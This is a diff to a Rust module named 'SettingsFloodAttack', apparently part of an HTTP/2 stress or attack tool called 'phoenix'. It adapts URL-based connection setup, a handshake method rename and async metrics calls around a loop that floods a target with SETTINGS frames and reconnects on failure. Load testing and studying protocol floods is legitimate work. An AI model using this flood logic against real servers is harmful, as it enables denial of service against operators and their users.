@@ -13,10 +13,12 @@
 use std::sync::Arc;
 use std::time::{Duration, Instant};
 
+use async_trait::async_trait;
 use bytes::Bytes;
 use phoenix_core::RawH2Connection;
 use phoenix_metrics::AttackMetrics;
 use tracing::{info, warn, error};
+use url::Url;
 
 use crate::{Attack, AttackContext, AttackError, AttackResult, parse_target};
 
@@ -135,8 +137,17 @@ impl Attack for SettingsFloodAttack {
                 let mut total_frames = 0u64;
                 let mut errors = 0u64;
                 
-                // Connect to target
-                let mut connection = match RawH2Connection::connect(&target_host, target_port).await {
+                // Connect to target - construct URL from host and port
+                let url_str = format!("https://{}:{}", target_host, target_port);
+                let url = match Url::parse(&url_str) {
+                    Ok(url) => url,
+                    Err(e) => {
+                        error!("Invalid URL for connection {}: {}", conn_idx, e);
+                        return (0, 1);
+                    }
+                };
+                
+                let mut connection = match RawH2Connection::connect(&url).await {
                     Ok(conn) => conn,
                     Err(e) => {
                         error!("Connection {} failed to connect: {}", conn_idx, e);
@@ -145,7 +156,7 @@ impl Attack for SettingsFloodAttack {
                 };
                 
                 // Perform handshake
-                if let Err(e) = connection.handshake().await {
+                if let Err(e) = connection.perform_handshake().await {
                     error!("Connection {} handshake failed: {}", conn_idx, e);
                     return (0, 1);
                 }
@@ -168,7 +179,7 @@ impl Attack for SettingsFloodAttack {
                         match connection.send_frame(settings_frame).await {
                             Ok(_) => {
                                 total_frames += 1;
-                                metrics.increment_requests();
+                                metrics.record_request(0, true, 0).await;
                                 
                                 // Update next frame time
                                 next_frame_time += interval;
@@ -183,10 +194,19 @@ impl Attack for SettingsFloodAttack {
                                 errors += 1;
                                 
                                 // Try to reconnect
-                                match RawH2Connection::connect(&target_host, target_port).await {
+                                let url_str = format!("https://{}:{}", target_host, target_port);
+                                let url = match Url::parse(&url_str) {
+                                    Ok(url) => url,
+                                    Err(e) => {
+                                        error!("Invalid URL during reconnection: {}", e);
+                                        break;
+                                    }
+                                };
+                                
+                                match RawH2Connection::connect(&url).await {
                                     Ok(new_conn) => {
                                         connection = new_conn;
-                                        if let Err(e) = connection.handshake().await {
+                                        if let Err(e) = connection.perform_handshake().await {
                                             error!("Reconnection handshake failed: {}", e);
                                             break;
                                         }
@@ -242,7 +262,7 @@ impl Attack for SettingsFloodAttack {
         }
         
         let actual_duration = start_time.elapsed();
-        let snapshot = metrics.snapshot();
+        let snapshot = metrics.snapshot().await;
         
         // Calculate actual FPS
         let actual_fps = if actual_duration.as_secs() > 0 {
